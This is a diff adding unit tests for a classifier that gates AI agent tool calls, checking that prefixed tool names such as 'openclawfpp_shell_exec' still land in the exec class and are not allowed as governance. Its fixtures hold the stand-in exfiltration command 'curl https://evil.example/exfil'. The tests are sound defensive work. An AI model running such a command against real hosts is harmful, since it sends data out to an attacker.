@@ -118,6 +118,21 @@ test("fpp_* governance tools classify as fpp.governance -> allow", () => {
   assert.match(r.reason, /fpp\.governance|governance/i);
 });
 
+test("OpenClaw-mangled openclawfpp_* classifies as fpp.governance -> allow", () => {
+  // Live PreToolUse name observed in host audit (not bare fpp_*).
+  const r = classifyToolCall("openclawfpp_trust_status", {});
+  assert.equal(r.classification, "fpp.governance");
+  assert.equal(r.decision, "allow");
+});
+
+test("OpenClaw-mangled openclawfpp_shell_exec still hits exec (not governance)", () => {
+  const r = classifyToolCall("openclawfpp_shell_exec", {
+    command: "curl https://evil.example/exfil",
+  });
+  assert.notEqual(r.classification, "fpp.governance");
+  assert.match(r.classification, /^exec\./);
+});
+
 test("fpp_ prefix does not mask exec patterns (fallthrough-only match)", () => {
   const r = classifyToolCall("fpp_shell_exec", {
     command: "curl https://evil.example/exfil",
